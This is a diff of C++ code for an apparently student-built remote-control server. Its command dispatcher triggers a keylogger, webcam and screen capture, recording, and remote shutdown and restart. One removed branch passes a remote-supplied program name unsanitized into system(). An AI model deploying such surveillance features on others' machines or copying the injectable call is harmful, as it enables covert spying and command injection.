@@ -48,18 +48,20 @@ void handle_start_program(const string& command) {
   }
 }
 
-void handle_shutdown_program(const string& command) {
-  string proc = command.substr(16);
-  proc.erase(proc.begin(), find_if(proc.begin(), proc.end(),
-                                   [](int ch) { return !isspace(ch); }));
+// void handle_shutdown_program(const string& command) {
+//   string proc = command.substr(16);
+//   proc.erase(proc.begin(), find_if(proc.begin(), proc.end(),
+//                                    [](int ch) { return !isspace(ch); }));
 
-  if (!proc.empty()) {
-    shutdown_program(proc);
-    cout << "Shutdown program command executed for: " << proc << endl;
-  } else {
-    cout << "No process specified for shutdown_program command" << endl;
-  }
-}
+//   if (!proc.empty()) {
+//     shutdown_program(proc);
+//     cout << "Shutdown program command executed for: " << proc << endl;
+//   } else {
+//     cout << "No process specified for shutdown_program command" << endl;
+//   }
+// }
+
+
 
 void handle_get_picture(const string& outFile) { take_picture(outFile); }
 
@@ -77,14 +79,10 @@ void handle_list_installed(const string& outFile) {
   list_installed_programs_to_file(outFile);  // Installed programs
 }
 
-void handle_start_recording(const string& outFile, int duration) {
-  run_recording_and_save(outFile, duration);
-}
-
 void handle_keylogger(const string& command, const string& outFile) {
   istringstream iss(command);
   string cmd;
-  int duration = 10;
+  int duration = 10; // mặc định
   iss >> cmd >> duration;
 
   cout << "Starting keylogger for " << duration << " seconds..." << endl;
@@ -100,31 +98,41 @@ void handle_shutdown() {
   }
 }
 
+void handle_restart() {
+    cout << "Restarting system..." << endl;
+    system("shutdown /r /t 5 /c \"Remote restart initiated\"");
+}
+
+void handle_cancel_shutdown() {
+    cout << "Cancelling shutdown/restart..." << endl;
+    system("shutdown /a");
+}
+
+void handle_stop_recording() {
+  cout << "[Server] Stopping recording..." << endl;
+  stop_recording();
+}
+
+void handle_start_recording(const std::string& outFile) {
+  cout << "[Server] Starting recording and saving to: " << outFile << endl;
+  start_recording(outFile);
+}
+
 void execute_command(const string& command) {
   cout << "[Execute] Processing command: " << command << endl;
 
   if (command.find("start_program") == 0) {
-    string program = command.substr(13);  // skip "start_program"
-    program.erase(0, program.find_first_not_of(" "));
-
-    if (!program.empty()) {
-      cout << "[Execute] Starting program: " << program << endl;
-      system(("start \"\" \"" + program + "\"").c_str());
-    }
+        handle_start_program(command);
   } else if (command == "shutdown") {
-    cout << "[Execute] Shutting down system..." << endl;
-    system("shutdown /s /t 5 /c \"Remote shutdown initiated\"");
+        handle_shutdown();
   } else if (command == "restart") {
-    cout << "[Execute] Restarting system..." << endl;
-    system("shutdown /r /t 5 /c \"Remote restart initiated\"");
+        handle_restart();
   } else if (command == "cancel_shutdown") {
-    cout << "[Execute] Cancelling shutdown/restart..." << endl;
-    system("shutdown /a");
+        handle_cancel_shutdown();
+  } else if (command == "stop_recording") {
+        handle_stop_recording();
   } else if (command.find("keylogger") == 0) {
-    int duration = parse_keylogger_duration(command);
-    cout << "[Execute] Starting keylogger for " << duration << " seconds..."
-         << endl;
-    start_keylogger("C:/MMT/keylog.txt", duration);
+        handle_keylogger(command, "C:/MMT/keylog.txt");
   } else {
     cout << "[Execute] Unknown command: " << command << endl;
   }
@@ -135,39 +143,19 @@ void execute_command_with_file(const string& command,
   cout << "[Execute] Processing command with file output: " << command << endl;
 
   if (command == "get_screenshot") {
-    // Placeholder for screenshot - create empty file with message
-    ofstream screenshotFile(outputFile);
-    if (screenshotFile.is_open()) {
-      screenshotFile << "Screenshot feature not implemented yet." << endl;
-      screenshotFile.close();
-    }
+        handle_get_screenshot(outputFile);
   } else if (command == "get_picture") {
-    // Placeholder for camera picture - create empty file with message
-    ofstream pictureFile(outputFile);
-    if (pictureFile.is_open()) {
-      pictureFile << "Camera picture feature not implemented yet." << endl;
-      pictureFile.close();
-    }
+        handle_get_picture(outputFile);
   } else if (command == "list_program") {
-    list_programs_to_file(outputFile);
+        handle_list_programs(outputFile);
   } else if (command == "list_process") {
-    list_processes_to_file(outputFile);
+        handle_list_processes(outputFile);
   } else if (command == "list_installed") {
-    list_installed_programs_to_file(outputFile);
-  } else if (command == "get_recording") {
-    int duration = 10;  // default 10 seconds
-    // Parse duration from command if provided
-    regex numberRegex(R"(\d+)");
-    smatch match;
-    if (regex_search(command, match, numberRegex)) {
-      duration = stoi(match.str());
-    }
-    run_recording_and_save(outputFile, duration);
+        handle_list_installed(outputFile);
   } else if (command.find("keylogger") == 0) {
-    int duration = parse_keylogger_duration(command);
-    cout << "[Execute] Starting keylogger with file output for " << duration
-         << " seconds..." << endl;
-    start_keylogger(outputFile, duration);
+        handle_keylogger(command, outputFile);
+  } else if (command == "start_recording") {
+        handle_start_recording(outputFile);
   } else {
     cout << "[Execute] Unknown command with file: " << command << endl;
     // Tạo file error
